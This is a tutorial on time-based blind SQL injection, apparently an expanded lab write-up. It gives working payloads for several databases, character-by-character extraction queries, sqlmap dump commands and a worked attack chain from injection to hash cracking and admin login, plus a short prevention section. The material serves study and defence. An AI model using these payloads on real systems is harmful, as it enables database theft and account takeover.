

---

## Time-Based Blind SQL Injection — Complete Guide

### Translation

Time-Based Blind SQL Injection is very similar to Boolean-Based (covered previously), where the same requests are sent — but this time there is **no visible indicator** of whether your queries are wrong or correct. Instead, the indicator of a successful query depends on the **time it takes for the query to complete**. This time delay is introduced using built-in methods like `SLEEP(x)` combined with a UNION statement. The `SLEEP()` method will only execute on a **successful UNION SELECT** statement.

---

**Step 1 — Find the number of columns:**
```sql
admin123' UNION SELECT SLEEP(5);--
```
If there is **no pause** in response time → query failed → wrong number of columns. Add another column:
```sql
admin123' UNION SELECT SLEEP(5),2;--
```
If the page **takes 5 seconds to respond** → 2 columns confirmed ✅

**Step 2 — Find the database name:**
```sql
admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```
Cycle through letters until the page delays. Then confirm:
```sql
admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--
```

**Step 3 — Find the table name:**
```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables 
WHERE table_schema = 'sqli_four' and table_name='users';--
```

**Step 4 — Find column names:**
```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'id';
```

**Step 5 — Find the username:**
```sql
admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin%
```
Cycle through letters until confirmed: username = **`admin`** ✅

**Step 6 — Find the password:**
```sql
admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like '4961%
```

---

## Additional Details — Deep Dive

---

### How Time-Based Blind SQLi Works

```
Normal request:     Page loads in ~200ms
Injected SLEEP(5):  Page loads in ~5200ms

Difference = 5000ms = SLEEP executed = condition TRUE ✅

No difference:      Condition FALSE ❌
```

This timing difference is the **only feedback channel** — no text changes, no error messages, just response time.

---

### SLEEP() vs Other Delay Methods

Different databases use different delay functions:

| Database | Delay Function | Example |
|---|---|---|
| **MySQL** | `SLEEP(5)` | `' AND SLEEP(5)--` |
| **MSSQL** | `WAITFOR DELAY` | `' WAITFOR DELAY '0:0:5'--` |
| **PostgreSQL** | `pg_sleep(5)` | `' AND pg_sleep(5)--` |
| **Oracle** | `dbms_pipe.receive_message` | `' AND 1=dbms_pipe.receive_message(('a'),5)--` |
| **SQLite** | `randomblob()` | `' AND 1=like('ABCDEFG',upper(hex(randomblob(500000000/2))))--` |

---

### Full Enumeration Workflow — Time-Based

```sql
-- ═══════════════════════════════════════
-- STEP 1: Confirm vulnerability
-- ═══════════════════════════════════════
-- If page delays 5 seconds → vulnerable!
' AND SLEEP(5)--
1' AND SLEEP(5)--
' OR SLEEP(5)--

-- ═══════════════════════════════════════
-- STEP 2: Find number of columns
-- ═══════════════════════════════════════
' UNION SELECT SLEEP(5)--              → no delay = 1 col wrong
' UNION SELECT SLEEP(5),2--            → no delay = 2 cols wrong
' UNION SELECT SLEEP(5),2,3--          → 5 sec delay = 3 cols ✅

-- ═══════════════════════════════════════
-- STEP 3: Get database name (letter by letter)
-- ═══════════════════════════════════════
' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'a%'--  → no delay
' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'b%'--  → no delay
...
' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 's%'--  → DELAY ✅
' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'sq%'-- → DELAY ✅
' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'sql%'- → DELAY ✅
-- Continue until full name found: sqli_four

-- ═══════════════════════════════════════
-- STEP 4: Get table names
-- ═══════════════════════════════════════
' UNION SELECT SLEEP(5),2,3 
  FROM information_schema.tables 
  WHERE table_schema='sqli_four' 
  AND table_name LIKE 'a%'--           → no delay
...
' UNION SELECT SLEEP(5),2,3 
  FROM information_schema.tables 
  WHERE table_schema='sqli_four' 
  AND table_name LIKE 'u%'--           → DELAY ✅
-- Continue: users ✅

-- ═══════════════════════════════════════
-- STEP 5: Get column names
-- ═══════════════════════════════════════
' UNION SELECT SLEEP(5),2,3 
  FROM information_schema.COLUMNS 
  WHERE TABLE_SCHEMA='sqli_four' 
  AND TABLE_NAME='users' 
  AND COLUMN_NAME LIKE 'u%'--          → DELAY ✅
-- Found: username, (exclude it, continue)
' UNION SELECT SLEEP(5),2,3 
  FROM information_schema.COLUMNS 
  WHERE TABLE_SCHEMA='sqli_four' 
  AND TABLE_NAME='users' 
  AND COLUMN_NAME LIKE 'p%'
  AND COLUMN_NAME != 'username'--      → DELAY ✅
-- Found: password ✅

-- ═══════════════════════════════════════
-- STEP 6: Extract credentials
-- ═══════════════════════════════════════
-- Find username
' UNION SELECT SLEEP(5),2,3 
  FROM users 
  WHERE username LIKE 'a%'--           → DELAY ✅
-- admin ✅

-- Find password
' UNION SELECT SLEEP(5),2,3 
  FROM users 
  WHERE username='admin' 
  AND password LIKE 'a%'--
-- cycle until found: 4961... ✅
```

---

### Making It More Efficient — SUBSTRING()

Instead of letter-by-letter guessing, use `SUBSTRING()` to extract one character at a time at a **specific position**:

```sql
-- Get 1st character of database name
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--

-- Get 2nd character
' AND IF(SUBSTRING(database(),2,1)='q', SLEEP(5), 0)--

-- Get 3rd character
' AND IF(SUBSTRING(database(),3,1)='l', SLEEP(5), 0)--

-- Get password character by character
' AND IF(SUBSTRING(
    (SELECT password FROM users WHERE username='admin'),
    1,1)='4', SLEEP(5), 0)--

' AND IF(SUBSTRING(
    (SELECT password FROM users WHERE username='admin'),
    2,1)='9', SLEEP(5), 0)--
```

---

### Using ASCII Values (More Reliable)

Instead of comparing characters directly, compare **ASCII values** — more reliable across character sets:

```sql
-- Check if first char of DB name has ASCII value > 109 (binary search!)
' AND IF(ASCII(SUBSTRING(database(),1,1)) > 109, SLEEP(5), 0)--

-- Binary search approach (much faster):
-- ASCII 's' = 115
-- Start: > 64? YES → > 96? YES → > 112? NO → > 104? YES → > 110? YES → = 115? YES = 's'
-- Only ~7 requests per character instead of 26!

-- Full password extraction with ASCII
' AND IF(ASCII(SUBSTRING(
    (SELECT password FROM users WHERE username='admin'),
    1,1)) > 50, SLEEP(5), 0)--
```

---

### Conditional Expressions for Different Databases

```sql
-- MySQL
' AND IF(condition, SLEEP(5), 0)--
' AND IF(1=1, SLEEP(5), SLEEP(0))--

-- MSSQL
'; IF (condition) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 
   WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND 1=(SELECT CASE WHEN (condition) 
         THEN (SELECT 1 FROM pg_sleep(5)) 
         ELSE 1 END)--

-- Oracle
' AND 1=(SELECT CASE WHEN (condition) 
         THEN dbms_pipe.receive_message(('a'),5) 
         ELSE 1 END FROM dual)--
```

---

### Automating with SQLMap

Manual time-based extraction is **extremely slow** — automate with SQLMap:

```bash
# Basic time-based detection
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --technique=T \       ← T = Time-based only
  --dbs

# Full enumeration
sqlmap -u "https://target.com/page?id=1" \
  --technique=T \
  --level=5 \
  --risk=3 \
  --dbs \
  --time-sec=5          ← set delay threshold

# Dump specific table
sqlmap -u "https://target.com/page?id=1" \
  --technique=T \
  -D sqli_four \
  -T users \
  --dump

# From Burp Suite request file
sqlmap -r request.txt \
  --technique=T \
  --dbs \
  --batch              ← auto-answer prompts

# Increase accuracy (avoid false positives)
sqlmap -u "https://target.com/page?id=1" \
  --technique=T \
  --time-sec=10 \      ← wait 10 seconds
  --retries=3          ← retry failed requests
```

---

### Comparison: All 3 Blind SQLi Types

| Feature | Boolean-Based | Time-Based | Out-of-Band |
|---|---|---|---|
| Feedback | Page content change | Response delay | DNS/HTTP request |
| Speed | Fast | **Very slow** | Fast |
| Reliability | High | Medium (network lag) | High |
| Works when | Page changes | No page change | No page change |
| Detection | Hard | Hard | Hard |
| Automation | SQLMap | SQLMap | SQLMap + Burp |

---

### Avoiding False Positives

Network lag can cause false positives in time-based SQLi:
```bash
# Measure baseline response time first
for i in {1..5}; do
  curl -s -o /dev/null -w "%{time_total}\n" "https://target.com/page?id=1"
done
# Average: ~0.3 seconds

# Use delay much larger than baseline
# If baseline = 0.3s, use SLEEP(5) or SLEEP(10)

# In SQLMap, set accordingly:
--time-sec=10   ← use 10 seconds if network is slow

# Multiple retries to confirm
--retries=5     ← retry 5 times to reduce false positives
```

---

### Real-World Attack Example

```
Target: https://shop.example.com/product?id=1

1. Confirm vulnerability:
   ?id=1' AND SLEEP(5)--
   → Page takes 5.2 seconds → VULNERABLE! ✅

2. Find DB name (automated with SQLMap):
   sqlmap -u "https://shop.example.com/product?id=1" --technique=T --dbs
   → Found database: shopdb

3. Find tables:
   sqlmap ... -D shopdb --tables
   → customers, orders, products, admin_users

4. Dump admin_users:
   sqlmap ... -D shopdb -T admin_users --dump
   → admin:$2y$10$hashedpassword (bcrypt hash)

5. Crack the hash:
   hashcat -m 3200 hash.txt rockyou.txt
   → admin:SuperSecret123!

6. Login to admin panel → GAME OVER
```

---

### Prevention

```php
// ❌ Vulnerable to time-based SQLi
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id=$id";

// ✅ Safe — parameterized query
$stmt = $pdo->prepare("SELECT * FROM products WHERE id=?");
$stmt->execute([$_GET['id']]);
```

Other defenses:
- Set **query timeout limits** on the database
- Use **Web Application Firewall (WAF)** — detects SLEEP() patterns
- Monitor for **slow query logs** — sudden slow queries = attack indicator
- Apply **rate limiting** — slows down automated extraction

---

## Key Takeaway

> Time-Based Blind SQLi is the **most patient attacker's technique** — it extracts your entire database one character at a time, letter by letter, using nothing but **clock ticks** as a communication channel. It's slow manually but **fully automatable** with SQLMap. Even if an application shows no error messages and no content changes, if it's vulnerable to SQLi, time will always tell the truth! ⏱️🛡️
